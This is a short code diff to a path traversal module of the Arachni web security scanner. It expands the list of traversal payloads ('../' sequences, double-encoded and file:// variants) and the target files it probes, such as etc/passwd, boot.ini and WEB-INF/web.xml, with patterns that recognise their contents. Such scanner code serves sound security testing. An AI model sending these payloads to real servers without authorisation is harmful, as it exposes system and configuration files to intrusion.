@@ -29,11 +29,12 @@ class Arachni::Modules::PathTraversal < Arachni::Module::Base
 
     def self.traversals
         @trv ||=  [
-            '../../../../../../../../../../../../../../../../',
-            '//%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/' +
-                '%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/' +
-                '%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/'
-        ]
+            '',
+            '/',
+            '/../../',
+            '../../',
+            '/../../../../../../../../../../../../../../../../',
+        ].map { |trv| [trv, "file://#{trv}"] }.flatten
     end
 
     def self.extensions
@@ -55,8 +56,9 @@ class Arachni::Modules::PathTraversal < Arachni::Module::Base
 
     def self.params
         @params ||= {
-            'etc/passwd' => /root:x:0:0:.+:[0-9a-zA-Z\/]+/im,
-            'boot.ini'   => /\[boot loader\](.*)\[operating systems\]/im
+            'etc/passwd'      => /root:x:0:0:.+:[0-9a-zA-Z\/]+/im,
+            'boot.ini'        => /\[boot loader\](.*)\[operating systems\]/im,
+            'WEB-INF/web.xml' => '<web-app'
         }
     end
 
